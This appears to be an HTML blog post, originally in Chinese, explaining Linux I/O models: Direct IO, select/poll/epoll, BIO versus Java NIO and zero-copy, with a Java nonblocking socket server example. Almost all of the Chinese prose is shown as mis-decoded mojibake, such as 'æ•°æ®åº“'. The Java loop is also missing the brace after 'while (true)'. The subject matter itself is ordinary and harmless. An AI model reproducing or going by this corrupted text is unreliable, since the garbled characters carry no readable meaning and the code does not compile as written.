<h2 id="Direct-IO"><a href="#Direct-IO" class="headerlink" title="Direct IO"></a>Direct IO</h2><p>æ•°æ®åº“ä¸€èˆ¬ä½¿ç”¨directIOï¼Œå°±æ˜¯è‡ªå·±ç®¡ç†pagecacheï¼Œå’Œlinuxæ“ä½œç³»ç»Ÿç®¡ç†çš„åŒºåˆ«æ˜¯å®ƒå¯ä»¥è‡ªå·±æ§åˆ¶ä¸€äº›å‚æ•°ï¼Œè€Œä¸ç”¨ä¿®æ”¹linuxå†…æ ¸pagecacheçš„å…¨å±€å‚æ•°</p>
<h2 id="Select-Poll-Epoll"><a href="#Select-Poll-Epoll" class="headerlink" title="Select Poll Epoll"></a>Select Poll Epoll</h2><h3 id="select"><a href="#select" class="headerlink" title="select"></a>select</h3><ol>
<li><p>fd_set ä½¿ç”¨æ•°ç»„å®ç°,fd_size æœ‰é™åˆ¶ 1024 bitmap , fdã€iã€‘ &#x3D; accept()</p>
</li>
<li><p>fd_setä¸å¯é‡ç”¨ï¼Œæ–°çš„fdè¿›æ¥ï¼Œé‡æ–°åˆ›å»º</p>
</li>
<li><p>ç”¨æˆ·æ€å’Œå†…æ ¸æ€æ‹·è´fdé›†åˆäº§ç”Ÿå¼€é”€</p>
</li>
<li><p>O(n)æ—¶é—´å¤æ‚åº¦çš„è½®è¯¢<br>â€‹</p>
</li>
</ol>
<p>æˆåŠŸè°ƒç”¨è¿”å›ç»“æœå¤§äº 0ï¼Œå‡ºé”™è¿”å›ç»“æœä¸º -1ï¼Œè¶…æ—¶è¿”å›ç»“æœä¸º 0, å…·æœ‰è¶…æ—¶æ—¶é—´</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848052.png" alt="img"></p>
<p>é¦–å…ˆï¼Œfd_setç»“æ„ä½“ä»…åŒ…å«ä¸€ä¸ªæ•´å‹æ•°ç»„ï¼Œè¯¥æ•°ç»„çš„æ¯ä¸€ä½ï¼ˆbitï¼‰æ ‡è®°ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚fd_setèƒ½å®¹çº³çš„æ–‡ä»¶æè¿°ç¬¦æ•°é‡ç”±FD_SETSIZEæŒ‡å®šï¼Œè¿™ä¹Ÿå°±é™åˆ¶äº†selectèƒ½åŒæ—¶å¤„ç†çš„æ–‡ä»¶æè¿°ç¬¦çš„æ€»é‡ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848060.png" alt="img"></p>
<p>FD_ZERO : æ¸…é™¤fdsetçš„æ‰€æœ‰ä½, FD_CLR æ¸…é™¤ä½fd, FD_SET è®¾ç½®fdsetçš„ä½fd, FD_ISSET æµ‹è¯•fdsetçš„ä½fdæ˜¯å¦è¢«è®¾ç½®è¿‡</p>
<h3 id="poll"><a href="#poll" class="headerlink" title="poll"></a>poll</h3><ol>
<li><p>ç”¨æˆ·æ€å’Œå†…æ ¸æ€æ‹·è´fdé›†åˆäº§ç”Ÿå¼€é”€</p>
</li>
<li><p>O(n)æ—¶é—´å¤æ‚åº¦çš„è½®è¯¢</p>
</li>
</ol>
<p>â€‹    åŸºäºç»“æ„ä½“å­˜å‚¨fd<br>â€‹    struct pollfd{<br>â€‹        int fd;<br>â€‹        short events;<br>â€‹        short revents; &#x2F;&#x2F;å¯é‡ç”¨<br>â€‹    }<br>â€‹    è§£å†³äº†selectçš„1,2ä¸¤ç‚¹ç¼ºç‚¹</p>
<p>int poll(struct pollfd *ufds, unsigned int nfds, int timeout)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">poll([&#123;fd=5, events=POLLIN|POLLERR&#125;], 1, -1) = 1 ([&#123;fd=5, revents=POLLIN&#125;])</span><br></pre></td></tr></table></figure>



<h3 id="epoll"><a href="#epoll" class="headerlink" title="epoll"></a>epoll</h3><ol>
<li>ç”¨æˆ·ç©ºé—´å¯ä»¥è°ƒç”¨epoll createè¿”å›ä¸€ä¸ªepfdå³epollæ–‡ä»¶æè¿°ç¬¦å³å…±äº«ç©ºé—´çš„åœ°å€ç»™åˆ°ç”¨æˆ·ç©ºé—´ï¼Œ</li>
<li>æœ‰ä¸€ä¸ªfdè¿‡æ¥äº†ä¹‹åï¼Œ ç”¨æˆ·æ§ä»¶å°±æŠŠè¿™ä¸ªfdä¼ ç»™epollæ–‡ä»¶æè¿°ç¬¦ï¼Œ ç„¶åepollä¼šå‡†å¤‡ä¸€ä¸ªçº¢é»‘æ ‘(å¢åˆ æ”¹ç”±å†…æ ¸å®Œæˆ)ï¼Œå’Œé“¾è¡¨ã€‚epollä¼šæŠŠè¿™ä¸ªfdæ³¨å†Œç»™çº¢é»‘æ ‘.</li>
<li>ç„¶åç”¨æˆ·ç©ºé—´ä¼šè°ƒä¸€ä¸ªç³»ç»Ÿè°ƒç”¨è°ƒåˆ°epollä¸Šï¼Œ æ­¤æ—¶è°ƒç”¨çš„æ˜¯wait,å®ƒä¼šé˜»å¡ï¼Œç›´åˆ°é“¾è¡¨ä¸­æœ‰æ•°æ®ï¼Œæ‰ä¼šè¿”å›ã€‚ç”±é˜»å¡å˜ä¸ºä¸é˜»å¡ã€‚</li>
<li>ç„¶åç”¨æˆ·ç©ºé—´å†å»è¯»é“¾è¡¨ï¼ŒæŠŠåˆ°è¾¾çš„å‡ ä¸ªæ–‡ä»¶æè¿°ç¬¦å–å‡ºæ¥ï¼Œç„¶åæ ¹æ®æ–‡ä»¶æè¿°ç¬¦çš„ç±»å‹åšä¸åŒçš„å¤„ç†ã€‚</li>
</ol>
<p>è§£å†³selectçš„1ï¼Œ2ï¼Œ3ï¼Œ4; ä¸éœ€è¦è½®è¯¢ï¼Œæ—¶é—´å¤æ‚åº¦ä¸ºO(1)</p>
<p>epoll_create ï¼šåˆ›å»ºä¸€ä¸ªç™½æ¿ï¼Œå­˜æ”¾fd_events</p>
<p>epoll_ctl ï¼šç”¨äºå‘å†…æ ¸æ³¨å†Œæ–°çš„æè¿°ç¬¦æˆ–è€…æ˜¯æ”¹å˜æŸä¸ªæ–‡ä»¶æè¿°ç¬¦çš„çŠ¶æ€ã€‚å·²æ³¨å†Œçš„æè¿°ç¬¦åœ¨å†…æ ¸ä¸­ä¼šè¢«ç»´æŠ¤åœ¨ä¸€æ£µçº¢é»‘æ ‘ä¸Š</p>
<p>epoll_wait ï¼šé€šè¿‡å›è°ƒå‡½æ•°å†…æ ¸ä¼šå°† I&#x2F;O å‡†å¤‡å¥½çš„æè¿°ç¬¦åŠ å…¥åˆ°ä¸€ä¸ªé“¾è¡¨ä¸­ç®¡ç†ï¼Œè¿›ç¨‹è°ƒç”¨epoll_wait() ä¾¿å¯ä»¥å¾—åˆ°äº‹ä»¶å®Œæˆçš„æè¿°ç¬¦</p>
<p>ä¸¤ç§è§¦å‘æ¨¡å¼ï¼š</p>
<ul>
<li><p>LT:æ°´å¹³è§¦å‘<br>â€‹å½“ epoll_wait() æ£€æµ‹åˆ°æè¿°ç¬¦äº‹ä»¶åˆ°è¾¾æ—¶ï¼Œå°†æ­¤äº‹ä»¶é€šçŸ¥è¿›ç¨‹ï¼Œè¿›ç¨‹å¯ä»¥ä¸ç«‹å³å¤„ç†è¯¥äº‹ä»¶ï¼Œä¸‹æ¬¡è°ƒç”¨ epoll_wait() ä¼šå†æ¬¡é€šçŸ¥è¿›ç¨‹ã€‚æ˜¯é»˜è®¤çš„ä¸€ç§æ¨¡å¼ï¼Œå¹¶ä¸”åŒæ—¶æ”¯æŒ Blocking å’Œ No-Blockingã€‚</p>
</li>
<li><p>ET:è¾¹ç¼˜è§¦å‘</p>
<p>å’Œ LT æ¨¡å¼ä¸åŒçš„æ˜¯ï¼Œé€šçŸ¥ä¹‹åè¿›ç¨‹å¿…é¡»ç«‹å³å¤„ç†äº‹ä»¶ã€‚ä¸‹æ¬¡å†è°ƒç”¨ epoll_wait() æ—¶ä¸ä¼šå†å¾—åˆ°äº‹ä»¶åˆ°è¾¾çš„é€šçŸ¥ã€‚å¾ˆå¤§ç¨‹åº¦ä¸Šå‡å°‘äº† epoll äº‹ä»¶è¢«é‡å¤è§¦å‘çš„æ¬¡æ•°ï¼Œå› æ­¤æ•ˆç‡è¦æ¯” LT æ¨¡å¼é«˜ã€‚åªæ”¯æŒ No-Blockingï¼Œä»¥é¿å…ç”±äºä¸€ä¸ªæ–‡ä»¶å¥æŸ„çš„é˜»å¡è¯»&#x2F;é˜»å¡å†™æ“ä½œæŠŠå¤„ç†å¤šä¸ªæ–‡ä»¶æè¿°ç¬¦çš„ä»»åŠ¡é¥¿æ­»ã€‚</p>
</li>
</ul>
<h3 id="åº”ç”¨åœºæ™¯"><a href="#åº”ç”¨åœºæ™¯" class="headerlink" title="åº”ç”¨åœºæ™¯"></a>åº”ç”¨åœºæ™¯</h3><h4 id="1-select-åº”ç”¨åœºæ™¯"><a href="#1-select-åº”ç”¨åœºæ™¯" class="headerlink" title="1. select åº”ç”¨åœºæ™¯"></a>1. select åº”ç”¨åœºæ™¯</h4><p>select çš„ timeout å‚æ•°ç²¾åº¦ä¸ºå¾®ç§’ï¼Œè€Œ poll å’Œ epoll ä¸ºæ¯«ç§’ï¼Œå› æ­¤ select æ›´åŠ é€‚ç”¨äºå®æ—¶æ€§è¦æ±‚æ¯”è¾ƒé«˜çš„åœºæ™¯ï¼Œæ¯”å¦‚æ ¸ååº”å †çš„æ§åˆ¶ã€‚</p>
<p>select å¯ç§»æ¤æ€§æ›´å¥½ï¼Œå‡ ä¹è¢«æ‰€æœ‰ä¸»æµå¹³å°æ‰€æ”¯æŒã€‚</p>
<h4 id="2-poll-åº”ç”¨åœºæ™¯"><a href="#2-poll-åº”ç”¨åœºæ™¯" class="headerlink" title="2. poll åº”ç”¨åœºæ™¯"></a>2. poll åº”ç”¨åœºæ™¯</h4><p>poll æ²¡æœ‰æœ€å¤§æè¿°ç¬¦æ•°é‡çš„é™åˆ¶ï¼Œå¦‚æœå¹³å°æ”¯æŒå¹¶ä¸”å¯¹å®æ—¶æ€§è¦æ±‚ä¸é«˜ï¼Œåº”è¯¥ä½¿ç”¨ poll è€Œä¸æ˜¯ selectã€‚</p>
<h4 id="3-epoll-åº”ç”¨åœºæ™¯"><a href="#3-epoll-åº”ç”¨åœºæ™¯" class="headerlink" title="3. epoll åº”ç”¨åœºæ™¯"></a>3. epoll åº”ç”¨åœºæ™¯</h4><p>åªéœ€è¦è¿è¡Œåœ¨ Linux å¹³å°ä¸Šï¼Œæœ‰å¤§é‡çš„æè¿°ç¬¦éœ€è¦åŒæ—¶è½®è¯¢ï¼Œå¹¶ä¸”è¿™äº›è¿æ¥æœ€å¥½æ˜¯é•¿è¿æ¥ã€‚</p>
<p>éœ€è¦åŒæ—¶ç›‘æ§å°äº 1000 ä¸ªæè¿°ç¬¦ï¼Œå°±æ²¡æœ‰å¿…è¦ä½¿ç”¨ epollï¼Œå› ä¸ºè¿™ä¸ªåº”ç”¨åœºæ™¯ä¸‹å¹¶ä¸èƒ½ä½“ç° epoll çš„ä¼˜åŠ¿ã€‚</p>
<p>éœ€è¦ç›‘æ§çš„æè¿°ç¬¦çŠ¶æ€å˜åŒ–å¤šï¼Œè€Œä¸”éƒ½æ˜¯éå¸¸çŸ­æš‚çš„ï¼Œä¹Ÿæ²¡æœ‰å¿…è¦ä½¿ç”¨ epollã€‚å› ä¸º epoll ä¸­çš„æ‰€æœ‰æè¿°ç¬¦éƒ½å­˜å‚¨åœ¨å†…æ ¸ä¸­ï¼Œé€ æˆæ¯æ¬¡éœ€è¦å¯¹æè¿°ç¬¦çš„çŠ¶æ€æ”¹å˜éƒ½éœ€è¦é€šè¿‡ epoll_ctl() è¿›è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œé¢‘ç¹ç³»ç»Ÿè°ƒç”¨é™ä½æ•ˆç‡ã€‚å¹¶ä¸” epoll çš„æè¿°ç¬¦å­˜å‚¨åœ¨å†…æ ¸ï¼Œä¸å®¹æ˜“è°ƒè¯•ã€‚</p>
<h2 id="BIO"><a href="#BIO" class="headerlink" title="BIO"></a>BIO</h2><p>æ¯ä¸ªçº¿ç¨‹å¯¹åº”æ¯ä¸ªè¿æ¥, ç”¨ä¸€ä¸ªä¸»çº¿ç¨‹æ¥å—è¿æ¥,è¿æ¥ä¸Šäº†ä¹‹ååˆ†é…ä¸€ä¸ªçº¿ç¨‹å»å¤„ç†è¯·æ±‚;</p>
<p>a.accept()</p>
<p>jdk 1.4 ç›´æ¥è°ƒç”¨accept()é˜»å¡ç­‰å¾…;  jdk 8ä¹‹åå…ˆè°ƒç”¨å¤šè·¯å¤ç”¨å™¨ poll(),è¿™ä¸ªpoll()ä¹Ÿä¼šé˜»å¡,ç„¶åæœ‰è¿æ¥è¿›æ¥å†è°ƒç”¨accept()æ¥å¤„ç†;</p>
<p>ç¼ºç‚¹: çº¿ç¨‹å¤ªå¤š; è°ƒåº¦å¼€é”€, èµ„æºæ¶ˆè€—, æ ¹æœ¬å°±æ˜¯å› ä¸ºæ˜¯é˜»å¡çš„;</p>
<p>socket()è¿”å›fd, ç„¶åbind(fd,9090),ç„¶ålisten(fd),ç„¶åaccept()</p>
<h2 id="NIO"><a href="#NIO" class="headerlink" title="NIO"></a>NIO</h2><p>OSç»´åº¦æ˜¯NONEBLOCKING IO éé˜»å¡çš„å…·ä½“å®ç°; javaç»´åº¦æ˜¯New IO; æœ‰æ²¡æœ‰NIOæ˜¯æ“ä½œç³»ç»Ÿå†…æ ¸å†³å®šçš„,è€Œä¸æ˜¯jaråŒ…; linuxå†…æ ¸è€ç‰ˆåªæ”¯æŒBIO; å†…æ ¸æ²¡æœ‰selectå°±ä¸ä¼šæœ‰java NIO; </p>
<p>ss.configureBlocking(false); è®¾ç½®OS éé˜»å¡</p>
<p>ä¼˜ç‚¹:å¯ä»¥ä¸€ä¸ªçº¿ç¨‹å¤„ç†Nä¸ªè¿æ¥ä»¥åŠè¯»å†™</p>
<p>å¼Šç«¯: ä¸é™çš„ç³»ç»Ÿè°ƒç”¨,ä¸Šä¸‹æ–‡åˆ‡æ¢èµ„æºæ¶ˆè€—å¾ˆå¤š,å¾ˆæµªè´¹cpuèµ„æº; å‡è®¾ä¸€ä¸ªçº¿ç¨‹å¤„ç†ä¸€ä¸‡ä¸ªè¯·æ±‚(C10Ké—®é¢˜), é‚£ä¹ˆä¸€æ¬¡whileå¾ªç¯ä¸€æ¬¡ä¼šæœ‰ä¸€ä¸‡æ¬¡readè°ƒç”¨; å‡è®¾å‰9999ä¸ªreadè°ƒç”¨éƒ½è¿”å›-1,æœ€åä¸€ä¸ªreadè¿”å›äº†æ•°æ®,é‚£ä¹ˆå‰9999ä¸ªread()è°ƒç”¨å°±ä¸è¯¥è°ƒ,O(n)çš„å¤æ‚åº¦;</p>
<p>NIO å±äºåŒæ­¥éé˜»å¡ï¼Œæ”¶åˆ°çš„è¯·æ±‚ä¼šå…ˆæ³¨å†Œåˆ°å¤šè·¯å¤ç”¨å™¨ Selector ä¸Šï¼Œå¤šè·¯å¤ç”¨å™¨è½®è¯¢ç›´åˆ°è¿æ¥æœ‰ I&#x2F;O è¯·æ±‚æ—¶æ‰å¯åŠ¨ä¸€ä¸ªçº¿ç¨‹è¿›è¡Œå¤„ç†ã€‚ä¹Ÿå°±æ˜¯å‰æ–‡ä¸­çš„<strong>å¤šè·¯å¤ç”¨ I&#x2F;O æ¨¡å‹</strong>ï¼Œè™½ç„¶è¯´å¤šè·¯å¤ç”¨æ¨¡å‹æ˜¯é˜»å¡çš„ï¼Œä½†åœ¨ NIO è¿™é‡Œï¼Œå› ä¸ºæœ‰<strong>Selector</strong>ï¼Œread å’Œ write æ“ä½œéƒ½æ˜¯éé˜»å¡çš„ï¼Œå…¶ä¸­ Selector å…¶å®å°±æ˜¯ select&#x2F;poll&#x2F;epoll çš„å¤–åŒ…ç±»ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848068.png" alt="image-20200610173230680"></p>
<p>ä¸ä»…å¦‚æ­¤ï¼ŒNIO é™¤äº†é¢å‘æµå’Œéé˜»å¡å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªæ•ˆç‡é«˜çš„åŸå› å°±æ˜¯å‰æ–‡ä¸­ä¹Ÿæœ‰æåˆ°çš„é›¶æ‹·è´ã€‚</p>
<p>NIO ä¸­çš„ Channelï¼ˆé€šé“ï¼‰ç›¸å½“äºæ“ä½œç³»ç»Ÿä¸­çš„å†…æ ¸ç¼“å†²åŒºï¼Œ Buffer å°±ç›¸å½“äºæ“ä½œç³»ç»Ÿä¸­çš„ç”¨æˆ·ç©ºé—´ç¼“å†²åŒºã€‚é›¶æ‹·è´åœ¨ NIO è¿™é‡Œé‡è¦çš„æ˜¯ä¸¤ä¸ªå®ç°ï¼š</p>
<ul>
<li>FileChannel.map() : åŸºäºå†…å­˜æ˜ å°„ <strong>mmap</strong> æ–¹å¼ä¸€ç§å®ç°ï¼Œå¯ä»¥æŠŠä¸€ä¸ªæ–‡ä»¶ä» position ä½ç½®å¼€å§‹çš„ size å¤§å°çš„åŒºåŸŸæ˜ å°„ä¸ºå†…å­˜æ˜ åƒæ–‡ä»¶ã€‚</li>
<li>FileChannel.transferTo() : é€šè¿‡è°ƒç”¨ <strong>sendfile</strong> æ–¹å¼å®ç°çš„é›¶æ‹·è´ã€‚</li>
</ul>
<p>å…³äº NIO è¿˜æœ‰ä¸€ä¸ªå¸¸è§çš„å®ç°ã€‚é‚£å°±æ˜¯ Netty , Netty æ˜¯ä¸€ä¸ªé«˜æ€§èƒ½ã€å¼‚æ­¥äº‹ä»¶é©±åŠ¨çš„ NIO æ¡†æ¶ï¼Œä½†ä¸ºå•¥ä¸ç›´æ¥ç”¨ JDK ä¸­çš„ NIO ï¼Œè€Œè¦å†é€ è½®å­å‘¢ï¼Œé‚£å½“ç„¶æ˜¯ Netty æ¯” JDK NIO åšçš„æ›´å¤šï¼Œæ¯”å¦‚è§£å†³äº†ç²˜åŒ…åŠåŒ…ã€æ–­è¿å’Œ idle å¤„ç†ã€æ”¯æŒæµé‡æ•´å½¢ç­‰ã€‚</p>
<p>å¦å¤–è¯´èµ· NIO çš„é›¶æ‹·è´ï¼Œæ¶ˆæ¯é˜Ÿåˆ—ç°åœ¨åŸºæœ¬æ˜¯æ ‡é…ï¼Œå¸¸ç”¨æœ‰ Kafkaã€RocketMQã€RabbitMQï¼Œæ’åæŒ‰æ€§èƒ½åˆ†å…ˆåã€‚å…¶ä¸­ Kafka å’Œ RocketMQ åˆ†åˆ«æ˜¯åŸºäº <strong>sendfile</strong> å’Œ <strong>mmap + write</strong>å®ç°çš„é›¶æ‹·è´ï¼Œè¿™ä¹Ÿæ˜¯ååé‡è¾ƒå¤§çš„åŸå› ä¹‹ä¸€ã€‚Nignx é€šè¿‡sendfile on é…ç½®å¯ä»¥å¼€å¯sendfileç³»ç»Ÿè°ƒç”¨ã€‚</p>
<p>å‡½æ•°å®šä¹‰ï¼šssize_t read(int fd, void * buf, size_t count);</p>
<p>å‡½æ•°è¯´æ˜ï¼šread()ä¼šæŠŠå‚æ•°fdæ‰€æŒ‡çš„æ–‡ä»¶ä¼ é€count ä¸ªå­—èŠ‚åˆ°buf æŒ‡é’ˆæ‰€æŒ‡çš„å†…å­˜ä¸­ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LinkedList&lt;SocketChannel&gt; clients = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line"><span class="type">ServerSocketChannel</span> <span class="variable">ss</span> <span class="operator">=</span> ServerSocketChannel.open(); <span class="comment">// æœåŠ¡ç«¯å¼€å¯ç›‘å¬: æ¥å—å®¢æˆ·ç«¯</span></span><br><span class="line">ss.bind(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">9090</span>));</span><br><span class="line">ss.configureBlocking(<span class="literal">false</span>); <span class="comment">//OS  NONBLOCKING åªè®©æ¥å—å®¢æˆ·ç«¯ ä¸é˜»å¡</span></span><br><span class="line"><span class="comment">// åœ¨ä¸€æ¬¡å¾ªç¯ä¸­å°è¯•æ¥å—ä¸€ä¸ªè¿æ¥,æ¥æ”¶åˆ°å°±å…¥é˜Ÿåˆ—</span></span><br><span class="line"><span class="comment">// ä¸€ä¸ªçº¿ç¨‹</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) </span><br><span class="line">    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">    <span class="type">SocketChannel</span> <span class="variable">client</span> <span class="operator">=</span> ss.accept(); <span class="comment">// ä¸ä¼šé˜»å¡,ç«‹åˆ»è¿”å›</span></span><br><span class="line"> 	<span class="comment">// accept è°ƒç”¨å†…æ ¸ : 1. æ²¡æœ‰å®¢æˆ·ç«¯è¿æ¥è¿›æ¥,è¿”å›å€¼? åœ¨BIOçš„æ—¶å€™ä¸€ç›´å¡ä½,ä½†æ˜¯åœ¨NIO,ä¸å¡ä½,è¿”å›-1</span></span><br><span class="line">    <span class="comment">// å¦‚æœæ¥å®¢æˆ·ç«¯çš„è¿æ¥, acceptè¿”å›çš„æ˜¯è¿™ä¸ªå®¢æˆ·ç«¯çš„fd 5, client object</span></span><br><span class="line">    <span class="comment">// NONBLOCKING å°±æ˜¯ä»£ç ä¸èƒ½å¡ä½,åªä¸è¿‡æœ‰ä¸åŒçš„æƒ…å†µ</span></span><br><span class="line">   	<span class="keyword">if</span> (client == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// System.out.println(&quot;null..&quot;);</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        client.configureBlocking(<span class="literal">false</span>); <span class="comment">// ä¿è¯å®¢æˆ·ç«¯ä¸é˜»å¡</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> client.socket().getPort();</span><br><span class="line">        System.out.println(<span class="string">&quot;client..port&quot;</span> + port);</span><br><span class="line">        clients.add(client);</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocateDirect(<span class="number">4096</span>);<span class="comment">// å¯ä»¥åœ¨å †é‡Œ,å †å¤–</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// éå†å·²ç»è¿æ¥è¿›æ¥çš„å®¢æˆ·ç«¯èƒ½ä¸èƒ½è¯»å†™æ•°æ®</span></span><br><span class="line">	<span class="keyword">for</span> (SocketChannel c : clients) &#123; <span class="comment">//ä¸²è¡ŒåŒ–,å¤šçº¿ç¨‹, å¯ä»¥æŠŠä»–ä»¬æŠ›ç»™å¤šä¸ªçº¿ç¨‹æˆ–è€…çº¿ç¨‹æ± å»å¤„ç†</span></span><br><span class="line">       </span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> c.read(buffer); <span class="comment">//&gt;0 -1 0 ä¸ä¼šé˜»å¡</span></span><br><span class="line">        <span class="keyword">if</span> (num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            buffer.flip();</span><br><span class="line">            <span class="type">byte</span>[] aa = <span class="keyword">new</span> <span class="title class_">byte</span>[buffer.limit()];</span><br><span class="line">            buffer.get(aa);</span><br><span class="line">            <span class="type">String</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(aa);</span><br><span class="line">            System.out.println(ss.socket().getPort() + <span class="string">&quot; : &quot;</span> + b);</span><br><span class="line">            buffer.clear();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>Java NIO ç”±ä»¥ä¸‹å‡ ä¸ªæ ¸å¿ƒéƒ¨åˆ†ç»„æˆï¼š</p>
<ul>
<li>Channels</li>
<li>Buffers</li>
<li>Selectors</li>
</ul>
<p>è™½ç„¶Java NIO ä¸­é™¤æ­¤ä¹‹å¤–è¿˜æœ‰å¾ˆå¤šç±»å’Œç»„ä»¶ï¼ŒChannelï¼ŒBuffer å’Œ Selector æ„æˆäº†æ ¸å¿ƒçš„APIã€‚å…¶å®ƒç»„ä»¶ï¼Œå¦‚Pipeå’ŒFileLockï¼Œåªä¸è¿‡æ˜¯ä¸ä¸‰ä¸ªæ ¸å¿ƒç»„ä»¶å…±åŒä½¿ç”¨çš„å·¥å…·ç±»ã€‚</p>
<h3 id="Channel-å’Œ-Buffer"><a href="#Channel-å’Œ-Buffer" class="headerlink" title="Channel å’Œ Buffer"></a>Channel å’Œ Buffer</h3><p>åŸºæœ¬ä¸Šï¼Œæ‰€æœ‰çš„ IO åœ¨NIO ä¸­éƒ½ä»ä¸€ä¸ªChannel å¼€å§‹ã€‚Channel æœ‰ç‚¹åƒæµã€‚ æ•°æ®å¯ä»¥ä»Channelè¯»åˆ°Bufferä¸­ï¼Œä¹Ÿå¯ä»¥ä»Buffer å†™åˆ°Channelä¸­ã€‚è¿™é‡Œæœ‰ä¸ªå›¾ç¤ºï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848074.png" alt="img"></p>
<p>Channelå’ŒBufferæœ‰å¥½å‡ ç§ç±»å‹ã€‚ä¸‹é¢æ˜¯JAVA NIOä¸­çš„ä¸€äº›ä¸»è¦Channelçš„å®ç°ï¼š</p>
<ul>
<li>FileChannel</li>
<li>DatagramChannel</li>
<li>SocketChannel</li>
<li>ServerSocketChannel</li>
</ul>
<p>æ­£å¦‚ä½ æ‰€çœ‹åˆ°çš„ï¼Œè¿™äº›é€šé“æ¶µç›–äº†UDP å’Œ TCP ç½‘ç»œIOï¼Œä»¥åŠæ–‡ä»¶IOã€‚</p>
<p>ä»¥ä¸‹æ˜¯Java NIOé‡Œå…³é”®çš„Bufferå®ç°ï¼š</p>
<ul>
<li>ByteBuffer</li>
<li>CharBuffer</li>
<li>DoubleBuffer</li>
<li>FloatBuffer</li>
<li>IntBuffer</li>
<li>LongBuffer</li>
<li>ShortBuffer</li>
</ul>
<p>è¿™äº›Bufferè¦†ç›–äº†ä½ èƒ½é€šè¿‡IOå‘é€çš„åŸºæœ¬æ•°æ®ç±»å‹ï¼šbyte, short, int, long, float, double å’Œ charã€‚</p>
<p>Java NIO è¿˜æœ‰ä¸ª MappedByteBufferï¼Œç”¨äºè¡¨ç¤ºå†…å­˜æ˜ å°„æ–‡ä»¶,åº•å±‚è°ƒç”¨mmapç³»ç»Ÿè°ƒç”¨</p>
<h3 id="Selector"><a href="#Selector" class="headerlink" title="Selector"></a>Selector</h3><p>Selectorå…è®¸å•çº¿ç¨‹å¤„ç†å¤šä¸ª Channelã€‚å¦‚æœä½ çš„åº”ç”¨æ‰“å¼€äº†å¤šä¸ªè¿æ¥ï¼ˆé€šé“ï¼‰ï¼Œä½†æ¯ä¸ªè¿æ¥çš„æµé‡éƒ½å¾ˆä½ï¼Œä½¿ç”¨Selectorå°±ä¼šå¾ˆæ–¹ä¾¿ã€‚ä¾‹å¦‚ï¼Œåœ¨ä¸€ä¸ªèŠå¤©æœåŠ¡å™¨ä¸­ã€‚</p>
<p>è¿™æ˜¯åœ¨ä¸€ä¸ªå•çº¿ç¨‹ä¸­ä½¿ç”¨ä¸€ä¸ªSelectorå¤„ç†3ä¸ªChannelçš„å›¾ç¤ºï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848080.png" alt="img"></p>
<p>è¦ä½¿ç”¨Selectorï¼Œå¾—å‘Selectoræ³¨å†ŒChannelï¼Œç„¶åè°ƒç”¨å®ƒçš„select()æ–¹æ³•ã€‚è¿™ä¸ªæ–¹æ³•ä¼šä¸€ç›´é˜»å¡åˆ°æŸä¸ªæ³¨å†Œçš„é€šé“æœ‰äº‹ä»¶å°±ç»ªã€‚ä¸€æ—¦è¿™ä¸ªæ–¹æ³•è¿”å›ï¼Œçº¿ç¨‹å°±å¯ä»¥å¤„ç†è¿™äº›äº‹ä»¶ï¼Œäº‹ä»¶çš„ä¾‹å­æœ‰å¦‚æ–°è¿æ¥è¿›æ¥ï¼Œæ•°æ®æ¥æ”¶ç­‰</p>
<p>recv() å’Œ send()ï¼šé¢å‘å·²è¿æ¥çš„TCP&#x2F;IPç±»å‹socketæ¥æ”¶æˆ–å‘é€æ•°æ®ã€‚</p>
<p>recvfrom() å’Œ sendto()ï¼šé¢å‘æ— è¿æ¥çš„UDPæ•°æ®æŠ¥ã€‚</p>
<h3 id="ä¸ªäººç†è§£"><a href="#ä¸ªäººç†è§£" class="headerlink" title="ä¸ªäººç†è§£"></a>ä¸ªäººç†è§£</h3><p>è°ƒç”¨selectæˆ–poll,selectæˆ–pollé€ä¸ªå»çœ‹é‚£ä¸ªæ•°æ®å‡†å¤‡å¥½äº†,ç„¶åè¿”å›çŠ¶æ€é›†,çŠ¶æ€é›†é‡Œé¢æœ‰å‡†å¥½äº†çš„æ–‡ä»¶æè¿°ç¬¦,æ¥ç€å°±å¯ä»¥è°ƒç”¨readæˆ–recvæˆ–writeè¯»å†™æ•°æ®;å†…æ ¸éå†é‚£ä¸ªå¥½äº†æ¯”è‡ªå·±å»çœ‹å°‘äº†å¾ˆå¤šæ¬¡ç³»ç»Ÿè°ƒç”¨,èƒ½çœå¾ˆå¤šæ—¶é—´</p>
<p>é˜»å¡å•çº¿ç¨‹</p>
